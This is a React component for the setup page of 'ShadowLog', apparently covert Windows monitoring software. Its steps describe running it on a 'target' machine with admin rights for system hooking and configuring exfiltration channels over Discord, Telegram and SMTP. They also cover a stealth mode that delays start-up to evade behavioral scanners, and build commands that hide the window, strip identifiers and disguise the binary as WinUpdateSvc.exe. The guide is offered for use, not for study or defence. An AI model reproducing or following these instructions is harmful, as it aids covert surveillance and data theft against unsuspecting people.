'use client';

import { useState } from 'react';

export default function SetupTabs() {
  const [activeTab, setActiveTab] = useState('quick');

  return (
    <div className="setupContainer">
      <div className="tabsHeader">
        <button
          className={`tabBtn ${activeTab === 'quick' ? 'active' : ''}`}
          onClick={() => setActiveTab('quick')}
        >
          Quick Start
        </button>
        <button
          className={`tabBtn ${activeTab === 'source' ? 'active' : ''}`}
          onClick={() => setActiveTab('source')}
        >
          Build from Source
        </button>
      </div>

      <div className={`tabPanel ${activeTab === 'quick' ? 'active' : ''}`}>
        <div className="stepItem">
          <div className="stepNum">01</div>
          <div className="stepContent">
            <h4>Download &amp; Extract</h4>
            <p>Download the latest <code>ShadowLog_Release.zip</code> archive from the release section below. Extract the contents on the target Windows environment.</p>
          </div>
        </div>

        <div className="stepItem">
          <div className="stepNum">02</div>
          <div className="stepContent">
            <h4>Execute with Privileges</h4>
            <p>Run the core monitor executable. It will automatically trigger a native Windows UAC prompt via an embedded manifest to acquire necessary administrative rights for system hooking.</p>
          </div>
        </div>

        <div className="stepItem">
          <div className="stepNum">03</div>
          <div className="stepContent">
            <h4>Configure Secure Channels</h4>
            <p>Complete the web-based setup wizard to define your AES-256-GCM encryption key and configure desired exfiltration channels (Discord, Telegram, SMTP).</p>
          </div>
        </div>

        <div className="stepItem">
          <div className="stepNum">04</div>
          <div className="stepContent">
            <h4>Initialize Stealth Mode</h4>
            <p>Click "Initialize Monitor". The service will lock the configuration, sleep for a randomized interval (60-180s) to evade behavioral scanners, and then commence silent monitoring.</p>
          </div>
        </div>
      </div>

      <div className={`tabPanel ${activeTab === 'source' ? 'active' : ''}`}>
        <div className="stepItem">
          <div className="stepNum">01</div>
          <div className="stepContent">
            <h4>Prerequisites</h4>
            <p>Ensure you have Go 1.21+ installed on a Windows environment. Optional: Install <code>garble</code> for advanced string obfuscation.</p>
          </div>
        </div>

        <div className="stepItem">
          <div className="stepNum">02</div>
          <div className="stepContent">
            <h4>Clone the Repository</h4>
            <div className="codeBlock">
              <code>git clone https://github.com/BGx-11/ShadowLog.git<br/>cd ShadowLog</code>
            </div>
          </div>
        </div>

        <div className="stepItem">
          <div className="stepNum">03</div>
          <div className="stepContent">
            <h4>Compile Hardened Binaries</h4>
            <div className="codeBlock">
              <code>
                <span className="codeComment"># Core Monitor (with hidden window flag)</span><br/>
                go build -trimpath -ldflags "-H windowsgui -s -w -buildid=" -o WinUpdateSvc.exe main.go<br/><br/>
                <span className="codeComment"># Forensic Decryptor</span><br/>
                go build -trimpath -ldflags "-H windowsgui -s -w -buildid=" -o Decryptor.exe decryptor/main.go
              </code>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
